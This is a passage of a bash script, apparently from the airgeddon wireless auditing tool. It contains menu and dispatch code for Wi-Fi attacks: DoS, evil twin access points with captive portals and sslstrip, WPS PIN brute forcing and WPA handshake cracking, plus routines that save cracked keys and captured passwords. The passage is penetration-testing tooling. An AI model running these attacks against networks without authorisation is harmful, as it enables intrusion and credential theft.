function store_array() {

	debug_print

	local values=("${@:3}")
	for i in "${!values[@]}"; do
		eval "${1}[\$2|${i}]=\${values[i]}"
	done
}

#Check if something (first parameter) is inside an array (second parameter)
contains_element() {

	debug_print

	local e
	for e in "${@:2}"; do
		[[ "${e}" = "${1}" ]] && return 0
	done
	return 1
}

#Print hints from the different hint pools depending of the menu
function print_hint() {

	debug_print

	declare -A hints

	case ${1} in
		"main_menu")
			store_array hints main_hints "${main_hints[@]}"
			hintlength=${#main_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[main_hints|${randomhint}]}
		;;
		"dos_attacks_menu")
			store_array hints dos_hints "${dos_hints[@]}"
			hintlength=${#dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[dos_hints|${randomhint}]}
		;;
		"handshake_tools_menu")
			store_array hints handshake_hints "${handshake_hints[@]}"
			hintlength=${#handshake_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[handshake_hints|${randomhint}]}
		;;
		"attack_handshake_menu")
			store_array hints handshake_attack_hints "${handshake_attack_hints[@]}"
			hintlength=${#handshake_attack_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[handshake_attack_hints|${randomhint}]}
		;;
		"decrypt_menu")
			store_array hints decrypt_hints "${decrypt_hints[@]}"
			hintlength=${#decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[decrypt_hints|${randomhint}]}
		;;
		"select_interface_menu")
			store_array hints select_interface_hints "${select_interface_hints[@]}"
			hintlength=${#select_interface_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[select_interface_hints|${randomhint}]}
		;;
		"language_menu")
			store_array hints language_hints "${language_hints[@]}"
			hintlength=${#language_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[language_hints|${randomhint}]}
		;;
		"option_menu")
			store_array hints option_hints "${option_hints[@]}"
			hintlength=${#option_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[option_hints|${randomhint}]}
		;;
		"evil_twin_attacks_menu")
			store_array hints evil_twin_hints "${evil_twin_hints[@]}"
			hintlength=${#evil_twin_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_hints|${randomhint}]}
		;;
		"et_dos_menu")
			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
			hintlength=${#evil_twin_dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_dos_hints|${randomhint}]}
		;;
		"wps_attacks_menu")
			store_array hints wps_hints "${wps_hints[@]}"
			hintlength=${#wps_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[wps_hints|${randomhint}]}
		;;
		"wep_attacks_menu")
			store_array hints wep_hints "${wep_hints[@]}"
			hintlength=${#wep_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[wep_hints|${randomhint}]}
		;;
		"beef_pre_menu")
			store_array hints beef_hints "${beef_hints[@]}"
			hintlength=${#beef_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[beef_hints|${randomhint}]}
		;;
	esac

	print_simple_separator
	language_strings "${language}" "${strtoprint}" "hint"
	print_simple_separator
}

#airgeddon main menu
function main_menu() {

	debug_print

	clear
	language_strings "${language}" 101 "title"
	current_menu="main_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	print_simple_separator
	language_strings "${language}" 118
	language_strings "${language}" 119
	language_strings "${language}" 169
	language_strings "${language}" 252
	language_strings "${language}" 333
	language_strings "${language}" 426
	print_simple_separator
	language_strings "${language}" 60
	language_strings "${language}" 444
	language_strings "${language}" 61
	print_hint ${current_menu}

	read -r main_option
	case ${main_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			dos_attacks_menu
		;;
		5)
			handshake_tools_menu
		;;
		6)
			decrypt_menu
		;;
		7)
			evil_twin_attacks_menu
		;;
		8)
			wps_attacks_menu
		;;
		9)
			wep_attacks_menu
		;;
		10)
			credits_option
		;;
		11)
			option_menu
		;;
		12)
			exit_script_option
		;;
		*)
			invalid_menu_option
		;;
	esac

	main_menu
}

#Evil Twin attacks menu
function evil_twin_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 253 "title"
	current_menu="evil_twin_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 255 "separator"
	language_strings "${language}" 256 et_onlyap_dependencies[@]
	language_strings "${language}" 257 "separator"
	language_strings "${language}" 259 et_sniffing_dependencies[@]
	language_strings "${language}" 261 et_sniffing_sslstrip_dependencies[@]
	language_strings "${language}" 396
	language_strings "${language}" 262 "separator"
	language_strings "${language}" 263 et_captive_portal_dependencies[@]
	print_simple_separator
	language_strings "${language}" 260
	print_hint ${current_menu}

	read -r et_option
	case ${et_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if check_interface_wifi; then
					et_mode="et_onlyap"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if check_interface_wifi; then
					et_mode="et_sniffing"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if check_interface_wifi; then
					et_mode="et_sniffing_sslstrip"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			beef_pre_menu
		;;
		9)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if check_interface_wifi; then
					et_mode="et_captive_portal"
					echo
					language_strings "${language}" 316 "yellow"
					language_strings "${language}" 115 "read"

					if explore_for_targets_option; then
						et_dos_menu
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		10)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	evil_twin_attacks_menu
}

#beef pre attack menu
function beef_pre_menu() {

	debug_print

	if [ ${return_to_et_main_menu_from_beef} -eq 1 ]; then
		return
	fi

	search_for_beef

	clear
	language_strings "${language}" 407 "title"
	current_menu="beef_pre_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator

	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
			language_strings "${language}" 409 "warning"
			language_strings "${language}" 416 "pink"
		else
			language_strings "${language}" 409 et_sniffing_sslstrip2_dependencies[@]
		fi
	else
		language_strings "${language}" 409 et_sniffing_sslstrip2_dependencies[@]
	fi

	print_simple_separator
	language_strings "${language}" 410
	print_simple_separator
	language_strings "${language}" 411
	print_hint ${current_menu}

	read -r beef_option
	case ${beef_option} in
		1)
			if contains_element "${beef_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if check_interface_wifi; then
					et_mode="et_sniffing_sslstrip2"
					get_bettercap_version
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		2)
			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
				echo
				language_strings "${language}" 412 "red"
				language_strings "${language}" 115 "read"
			else
				prepare_beef_start
			fi
		;;
		3)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	beef_pre_menu
}

#WPS attacks menu
function wps_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 334 "title"
	current_menu="wps_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49 wash_scan_dependencies[@]
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 345 bully_attacks_dependencies[@]
	language_strings "${language}" 357 reaver_attacks_dependencies[@]
	language_strings "${language}" 346 bully_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 358 reaver_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 347 bully_attacks_dependencies[@]
	language_strings "${language}" 359 reaver_attacks_dependencies[@]
	language_strings "${language}" 348 bully_attacks_dependencies[@]
	language_strings "${language}" 360 reaver_attacks_dependencies[@]
	print_simple_separator
	language_strings "${language}" 361
	print_hint ${current_menu}

	read -r wps_option
	case ${wps_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				explore_for_wps_targets_option
			fi
		;;
		5)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="custompin_bully"
				get_bully_version
				set_bully_verbosity
				if wps_attacks_parameters; then
					exec_wps_custom_pin_bully_attack
				fi
			fi
		;;
		6)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="custompin_reaver"
				if wps_attacks_parameters; then
					exec_wps_custom_pin_reaver_attack
				fi
			fi
		;;
		7)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pixiedust_bully"
				get_bully_version
				set_bully_verbosity
				if validate_bully_pixiewps_version; then
					echo
					language_strings "${language}" 368 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						exec_bully_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 367 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pixiedust_reaver"
				get_reaver_version
				if validate_reaver_pixiewps_version; then
					echo
					language_strings "${language}" 370 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						exec_reaver_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 371 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		9)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="bruteforce_bully"
				get_bully_version
				set_bully_verbosity
				if wps_attacks_parameters; then
					exec_wps_bruteforce_pin_bully_attack
				fi
			fi
		;;
		10)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="bruteforce_reaver"
				get_reaver_version
				if wps_attacks_parameters; then
					exec_wps_bruteforce_pin_reaver_attack
				fi
			fi
		;;
		11)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pindb_bully"
				get_bully_version
				set_bully_verbosity

				db_error=0
				if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
					if check_pins_database_file; then
						echo
						language_strings "${language}" 373 "blue"
					else
						echo
						language_strings "${language}" 372 "red"
						db_error=1
					fi
				else
					echo
					language_strings "${language}" 379 "blue"
				fi
				language_strings "${language}" 115 "read"

				if [ "${db_error}" -eq 0 ]; then
					if wps_attacks_parameters; then
						exec_wps_pin_database_bully_attack
					fi
				fi
			fi
		;;
		12)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pindb_reaver"
				get_reaver_version

				db_error=0
				if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
					if check_pins_database_file; then
						echo
						language_strings "${language}" 373 "blue"
					else
						echo
						language_strings "${language}" 372 "red"
						db_error=1
					fi
				else
					echo
					language_strings "${language}" 379 "blue"
				fi
				language_strings "${language}" 115 "read"
				if [ "${db_error}" -eq 0 ]; then
					if wps_attacks_parameters; then
						exec_wps_pin_database_reaver_attack
					fi
				fi
			fi
		;;
		13)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	wps_attacks_menu
}

#WEP attacks menu
function wep_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 427 "title"
	current_menu="wep_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 423 wep_attack_dependencies[@]
	print_simple_separator
	language_strings "${language}" 174
	print_hint ${current_menu}

	read -r wep_option
	case ${wep_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wep_option
			fi
		;;
		6)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	wep_attacks_menu
}

#Offline decryption attacks menu
function decrypt_menu() {

	debug_print

	clear
	language_strings "${language}" 170 "title"
	current_menu="decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	language_strings "${language}" 176 "separator"
	language_strings "${language}" 172
	language_strings "${language}" 175 aircrack_attacks_dependencies[@]
	language_strings "${language}" 229 "separator"
	language_strings "${language}" 230 hashcat_attacks_dependencies[@]
	language_strings "${language}" 231 hashcat_attacks_dependencies[@]
	language_strings "${language}" 232 hashcat_attacks_dependencies[@]
	print_simple_separator
	language_strings "${language}" 174
	print_hint ${current_menu}

	read -r decrypt_option
	case ${decrypt_option} in
		1)
			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aircrack_dictionary_attack_option
			fi
		;;
		2)
			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aircrack_bruteforce_attack_option
			fi
		;;
		3)
			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_dictionary_attack_option
			fi
		;;
		4)
			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_bruteforce_attack_option
			fi
		;;
		5)
			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_rulebased_attack_option
			fi
		;;
		6)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	decrypt_menu
}

#Read the user input on rules file questions
function ask_rules() {

	debug_print

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "rules"
	done
	language_strings "${language}" 241 "yellow"
}

#Read the user input on dictionary file questions
function ask_dictionary() {

	debug_print

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "dictionary"
	done
	language_strings "${language}" 181 "yellow"
}

#Read the user input on Handshake file questions
function ask_capture_file() {

	debug_print

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "targetfilefordecrypt"
	done
	language_strings "${language}" 189 "yellow"
}

#Manage the questions on Handshake file questions
function manage_asking_for_captured_file() {

	debug_print

	if [ -n "${enteredpath}" ]; then
		echo
		language_strings "${language}" 186 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "n" ]; then
			ask_capture_file
		fi
	else
		ask_capture_file
	fi
}

#Manage the questions on dictionary file questions
function manage_asking_for_dictionary_file() {

	debug_print

	if [ -n "${DICTIONARY}" ]; then
		echo
		language_strings "${language}" 183 "blue"
		ask_yesno 184 "yes"
		if [ "${yesno}" = "n" ]; then
			ask_dictionary
		fi
	else
		ask_dictionary
	fi
}

#Manage the questions on rules file questions
function manage_asking_for_rule_file() {

	debug_print

	if [ -n "${RULES}" ]; then
		echo
		language_strings "${language}" 239 "blue"
		ask_yesno 240 "yes"
		if [ "${yesno}" = "n" ]; then
			ask_rules
		fi
	else
		ask_rules
	fi
}

#Validate the file to be cleaned
function check_valid_file_to_clean() {

	debug_print

	nets_from_file=$(echo "1" | aircrack-ng "${1}" 2> /dev/null | grep -E "WPA|WEP" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${nets_from_file}" = "" ]; then
		return 1
	fi

	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
		fi
	done

	if [ ${option_counter} -le 1 ]; then
		return 1
	fi

	handshakefilesize=$(wc -c "${filetoclean}" 2> /dev/null | awk -F " " '{print$1}')
	if [ "${handshakefilesize}" -le 1024 ]; then
		return 1
	fi

	if ! echo "1" | aircrack-ng "${1}" 2> /dev/null | grep -E "1 handshake" > /dev/null; then
		return 1
	fi

	return 0
}

#Check if a bssid is present on a capture file to know if there is a Handshake with that bssid
function check_bssid_in_captured_file() {

	debug_print

	nets_from_file=$(echo "1" | aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	echo
	if [ "${nets_from_file}" = "" ]; then
		if [ ! -f "${1}" ]; then
			language_strings "${language}" 161 "red"
			language_strings "${language}" 115 "read"
		else
			language_strings "${language}" 216 "red"
			language_strings "${language}" 115 "read"
		fi
		return 1
	fi

	declare -A bssids_detected
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			language_strings "${language}" 322 "yellow"
			return 0
		fi
	done

	language_strings "${language}" 323 "red"
	language_strings "${language}" 115 "read"
	return 1
}

#Set the target vars to a bssid selecting them from a capture file which has a Handshake
function select_wpa_bssid_target_from_captured_file() {

	debug_print

	nets_from_file=$(echo "1" | aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	echo
	if [ "${nets_from_file}" = "" ]; then
		language_strings "${language}" 216 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	declare -A bssids_detected
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			language_strings "${language}" 192 "blue"
			ask_yesno 193 "yes"

			if [ "${yesno}" = "y" ]; then
				bssid=${targetbssid}
				return 0
			fi
			break
		fi
	done

	bssid_autoselected=0
	if [ ${option_counter} -gt 1 ]; then
		option_counter=0
		for item in ${nets_from_file}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then

				option_counter=$((option_counter + 1))

				if [ ${option_counter} -lt 10 ]; then
					space=" "
				else
					space=""
				fi

				echo -n "${option_counter}.${space}${item}"
			elif [[ ${item} =~ \)$ ]]; then
				echo -en "${item}\r\n"
			else
				echo -en " ${item} "
			fi
		done
		print_hint ${current_menu}

		target_network_on_file=0
		while [[ ! ${target_network_on_file} =~ ^[[:digit:]]+$ ]] || (( target_network_on_file < 1 || target_network_on_file > option_counter )); do
			echo
			language_strings "${language}" 3 "green"
			read -r target_network_on_file
		done

	else
		target_network_on_file=1
		bssid_autoselected=1
	fi

	bssid=${bssids_detected[${target_network_on_file}]}

	if [ ${bssid_autoselected} -eq 1 ]; then
		language_strings "${language}" 217 "blue"
	fi

	return 0
}

#Validate and ask for the different parameters used in an aircrack dictionary based attack
function aircrack_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_dictionary_attack
	manage_aircrack_pot
}

#Validate and ask for the different parameters used in an aircrack bruteforce based attack
function aircrack_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
		return
	fi

	set_minlength_and_maxlength

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 11 )); do
		set_charset "aircrack"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_bruteforce_attack
	manage_aircrack_pot
}

#Validate and ask for the different parameters used in a hashcat dictionary based attack
function hashcat_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
		return
	fi

	if ! convert_cap_to_hashcat_format; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_dictionary_attack
	manage_hashcat_pot
}

#Validate and ask for the different parameters used in a hashcat bruteforce based attack
function hashcat_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
		return
	fi

	if ! convert_cap_to_hashcat_format; then
		return
	fi

	set_minlength_and_maxlength

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 5 )); do
		set_charset "hashcat"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_bruteforce_attack
	manage_hashcat_pot
}

#Validate and ask for the different parameters used in a hashcat rule based attack
function hashcat_rulebased_attack_option() {

	debug_print

	manage_asking_for_captured_file

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
		return
	fi

	if ! convert_cap_to_hashcat_format; then
		return
	fi

	manage_asking_for_dictionary_file
	manage_asking_for_rule_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_rulebased_attack
	manage_hashcat_pot
}

#Check if the password was decrypted using hashcat and manage to save it on a file
function manage_hashcat_pot() {

	debug_print

	hashcat_output=$(cat "${tmpdir}${hashcat_output_file}")

	pass_decrypted_by_hashcat=0
	if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat3_version}"; then
		local regexp="Status\.+:[[:space:]]Cracked"
		if [[ ${hashcat_output} =~ ${regexp} ]]; then
			pass_decrypted_by_hashcat=1
		else
			if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
				if [[ -f "${tmpdir}${hashcat_pot_tmp}" ]]; then
					pass_decrypted_by_hashcat=1
				fi
			fi
		fi
	else
		local regexp="All hashes have been recovered"
		if [[ ${hashcat_output} =~ ${regexp} ]]; then
			pass_decrypted_by_hashcat=1
		fi
	fi

	if [ "${pass_decrypted_by_hashcat}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then

			hashcat_potpath="${default_save_path}"
			lastcharhashcat_potpath=${hashcat_potpath: -1}
			if [ "${lastcharhashcat_potpath}" != "/" ]; then
				hashcat_potpath="${hashcat_potpath}/"
			fi
			hashcatpot_filename="hashcat-${bssid}.txt"
			hashcat_potpath="${hashcat_potpath}${hashcatpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "hashcatpot"
			done

			[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
			{
			echo ""
			date +%Y-%m-%d
			echo "${hashcat_texts[${language},1]}"
			echo ""
			echo "BSSID: ${bssid}"
			echo ""
			echo "---------------"
			echo ""
			echo "${hashcat_key}"
			} >> "${potenteredpath}"

			add_contributing_footer_to_file "${potenteredpath}"

			echo
			language_strings "${language}" 236 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the password was decrypted using aircrack and manage to save it on a file
function manage_aircrack_pot() {

	debug_print

	pass_decrypted_by_aircrack=0
	if [ -f "${tmpdir}${aircrack_pot_tmp}" ]; then
		pass_decrypted_by_aircrack=1
	fi

	if [ "${pass_decrypted_by_aircrack}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then
			aircrack_potpath="${default_save_path}"
			lastcharaircrack_potpath=${aircrack_potpath: -1}
			if [ "${lastcharaircrack_potpath}" != "/" ]; then
				aircrack_potpath="${aircrack_potpath}/"
			fi
			aircrackpot_filename="aircrack-${bssid}.txt"
			aircrack_potpath="${aircrack_potpath}${aircrackpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "aircrackpot"
			done

			aircrack_key=$(cat "${tmpdir}${aircrack_pot_tmp}")
			{
			echo ""
			date +%Y-%m-%d
			echo "${aircrack_texts[${language},1]}"
			echo ""
			echo "BSSID: ${bssid}"
			echo ""
			echo "---------------"
			echo ""
			echo "${aircrack_key}"
			} >> "${aircrackpotenteredpath}"

			add_contributing_footer_to_file "${aircrackpotenteredpath}"

			echo
			language_strings "${language}" 440 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the passwords were captured using ettercap and manage to save them on a file
function manage_ettercap_log() {

	debug_print

	ettercap_log=0
	ask_yesno 302 "yes"
	if [ "${yesno}" = "y" ]; then
		ettercap_log=1
		default_ettercap_logpath="${default_save_path}"
		lastcharettercaplogpath=${default_ettercap_logpath: -1}
		if [ "${lastcharettercaplogpath}" != "/" ]; then
			ettercap_logpath="${default_ettercap_logpath}/"
		fi
		default_ettercaplogfilename="evil_twin_captured_passwords-${essid}.txt"
		rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
		tmp_ettercaplog="${tmpdir}${ettercap_file}"
		default_ettercap_logpath="${ettercap_logpath}${default_ettercaplogfilename}"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ettercaplog"
		done
	fi
}

#Check if the passwords were captured using bettercap and manage to save them on a file
function manage_bettercap_log() {

	debug_print

	bettercap_log=0
	ask_yesno 302 "yes"
	if [ "${yesno}" = "y" ]; then
		bettercap_log=1
		default_bettercap_logpath="${default_save_path}"
		lastcharbettercaplogpath=${default_bettercap_logpath: -1}
		if [ "${lastcharbettercaplogpath}" != "/" ]; then
			bettercap_logpath="${default_bettercap_logpath}/"
		fi
		default_bettercaplogfilename="evil_twin_captured_passwords-bettercap-${essid}.txt"
		rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
		tmp_bettercaplog="${tmpdir}${bettercap_file}"
		default_bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "bettercaplog"
		done
	fi
}

#Check if the password was captured using wep all-in-one attack and manage to save it on a file
function manage_wep_log() {

	debug_print

	wep_potpath=$(env | grep ^HOME | awk -F = '{print $2}')
	lastcharwep_potpath=${wep_potpath: -1}
	if [ "${lastcharwep_potpath}" != "/" ]; then
		wep_potpath="${wep_potpath}/"
	fi
	weppot_filename="wep_captured_key-${essid}.txt"
	wep_potpath="${wep_potpath}${weppot_filename}"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "weppot"
	done
}

#Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
function manage_captive_portal_log() {

	debug_print

	default_et_captive_portal_logpath="${default_save_path}"
	lastcharetcaptiveportallogpath=${default_et_captive_portal_logpath: -1}
	if [ "${lastcharetcaptiveportallogpath}" != "/" ]; then
		et_captive_portal_logpath="${default_et_captive_portal_logpath}/"
	fi
	default_et_captive_portallogfilename="evil_twin_captive_portal_password-${essid}.txt"
	default_et_captive_portal_logpath="${et_captive_portal_logpath}${default_et_captive_portallogfilename}"
	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "et_captive_portallog"
	done
}

#Captive portal language menu
function set_captive_portal_language() {

	debug_print

	clear
	language_strings "${language}" 293 "title"
	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	echo
	language_strings "${language}" 318 "green"
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
